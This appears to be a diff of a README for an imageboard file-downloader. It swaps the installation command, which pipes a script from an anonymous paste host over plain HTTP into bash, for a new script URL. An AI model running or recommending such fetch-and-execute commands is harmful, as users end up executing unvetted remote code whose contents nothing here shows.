@@ -10,7 +10,7 @@ Download files from imageboards.
 
 ## Installation
 ```
-curl http://0x0.st/zr4W.sh | bash
+curl http://0x0.st/i49Y.sh | bash
 ```
 ## Usage Examples
 * Download all files from thread no. 3670653 of 4chan's /jp/ board.
